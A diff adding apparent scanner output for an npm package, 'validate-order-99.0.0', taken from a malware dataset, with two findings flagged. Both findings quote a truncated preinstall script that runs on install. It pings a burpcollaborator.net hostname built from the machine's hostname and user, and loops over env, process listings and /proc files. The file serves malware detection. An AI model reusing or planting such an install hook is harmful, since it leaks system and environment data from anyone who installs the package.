@@ -1,0 +1,28 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "npm-steganography": {},
+        "npm-exec-base64": {},
+        "npm-silent-process-execution": {},
+        "npm-exfiltrate-sensitive-data": {},
+        "npm-serialize-environment": {},
+        "npm-install-script": [
+            {
+                "location": "package/package.json:8",
+                "code": "    \"preinstall\": \"export HOSTNAME && BCNET=\\\"linux-validate-order-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\\\"; ping -c 1 $BCNET; for i in env \\\"ps aux\\\" \\\"cat /proc/version /proc/net/fib_trie /proc/net/if_inet... || true\"\n",
+                "message": "The package.json has a script automatically running when the package is installed"
+            }
+        ],
+        "npm-obfuscation": {},
+        "shady-links": [
+            {
+                "location": "package/package.json:8",
+                "code": "    \"preinstall\": \"export HOSTNAME && BCNET=\\\"linux-validate-order-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\\\"; ping -c 1 $BCNET; for i in env \\\"ps aux\\\" \\\"cat /proc/version /proc/net/fib_trie /proc/net/if_inet... || true\"\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "npm-dll-hijacking": {}
+    },
+    "path": "./dataset/npm/validate-order-99.0.0"
+}
